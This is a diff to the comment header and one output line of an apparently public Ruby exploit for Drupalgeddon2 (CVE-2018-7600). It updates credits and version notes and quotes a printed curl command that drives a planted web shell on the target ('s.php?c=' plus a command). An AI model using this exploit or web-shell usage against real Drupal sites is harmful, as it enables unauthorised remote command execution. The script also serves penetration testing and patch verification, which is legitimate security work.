@@ -1,14 +1,16 @@
 #!/usr/bin/env ruby
 #
-# Hans Topo ruby port of Drupalggedon2 exploit ~ https://github.com/dreadlocked/Drupalgeddon2/    (EDBID: 44449 ~ https://www.exploit-db.com/exploits/44449/)
-# Based on Vitalii Rudnykh exploit ~ https://github.com/a2u/CVE-2018-7600	                      (EDBID: 44448 ~ https://www.exploit-db.com/exploits/44448/)
+# Hans Topo & g0tmi1k's ruby port of Drupalggedon2 exploit ~ https://github.com/dreadlocked/Drupalgeddon2/   (EDBID: 44449 ~ https://www.exploit-db.com/exploits/44449/)
+# Based on Vitalii Rudnykh exploit ~ https://github.com/a2u/CVE-2018-7600   (EDBID: 44448 ~ https://www.exploit-db.com/exploits/44448/)
+# Hans Topo ~ https://github.com/dreadlocked
+# g0tmi1k ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
 #
 # Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
 # Vulnerable Versions:
 #          < 7.58
 #    8.x   < 8.3.9
-#    8.4.x < 8.4.6   [TESTED]
-#    8.5.x < 8.5.1   [TESTED]
+#    8.4.x < 8.4.6   (TESTED)
+#    8.5.x < 8.5.1   (TESTED)
 #
 # WriteUp & Thx ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
 # REF phpinfo() ~ https://twitter.com/i_bo0om/status/984674893768921089                   (curl - user/register - mail - #post_render)
@@ -122,7 +124,7 @@ end
 
 # Feedback
 puts "-"*80
-puts "[*]   curl " + target + "s.php?c=#{command}"
+puts "[*]   curl '" + target + "s.php?c=#{command}'"
 puts "-"*80
 
 # Now run our command
